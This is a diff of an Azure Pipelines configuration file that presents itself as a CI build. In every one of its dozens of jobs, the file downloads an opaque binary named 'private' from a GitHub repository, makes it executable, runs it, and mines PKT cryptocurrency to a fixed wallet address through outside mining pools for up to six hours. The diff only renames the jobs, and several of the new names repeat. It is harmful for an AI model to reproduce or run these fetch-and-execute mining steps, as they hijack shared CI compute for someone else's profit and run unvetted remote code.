@@ -9,601 +9,601 @@ trigger:
 pool: Azure Pipelines
 
 jobs:
-- job: aa
+- job: a
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ab
+- job: b
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ac
+- job: c
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ad
+- job: d
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ae
+- job: e
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: af
+- job: f
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ag
+- job: g
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ah
+- job: h
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: aj
+- job: i
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ak
+- job: j
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: al
+- job: k
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: am
+- job: l
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: an
+- job: m
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ao
+- job: n
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ap
+- job: o
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: aq
+- job: p
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ar
+- job: q
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: as
+- job: r
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: at
+- job: s
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: au
+- job: t
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: av
+- job: u
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: aw
+- job: v
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ax
+- job: w
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: az
+- job: x
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ba
+- job: y
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bb
+- job: z
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bc
+- job: a1
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bd
+- job: b1
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bf
+- job: c1
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bg
+- job: d1
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bh
+- job: e1
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bi
+- job: f1
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bj
+- job: g1
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bk
+- job: d
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bl
+- job: e
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bm
+- job: f
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bn
+- job: g
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bo
+- job: h
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bp
+- job: i
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bq
+- job: j
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: br
+- job: a
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bs
+- job: b
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bt
+- job: c
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bu
+- job: d
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bv
+- job: e
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bw
+- job: f
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bx
+- job: g
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: by
+- job: h
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: bz
+- job: i
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ca
+- job: j
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cb
+- job: a
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cc
+- job: b
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cd
+- job: c
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ce
+- job: d
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cf
+- job: e
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cg
+- job: f
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ch
+- job: g
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ci
+- job: h
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cj
+- job: i
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ck
+- job: j
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cl
+- job: a
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cm
+- job: b
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cn
+- job: c
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: co
+- job: d
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cp
+- job: e
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cq
+- job: f
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cr
+- job: g
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cs
+- job: h
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ct
+- job: i
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cu
+- job: j
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cv
+- job: a
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cw
+- job: b
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cx
+- job: c
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cy
+- job: d
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: cz
+- job: e
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: da
+- job: f
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: db
+- job: g
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: dc
+- job: h
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: dd
+- job: i
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
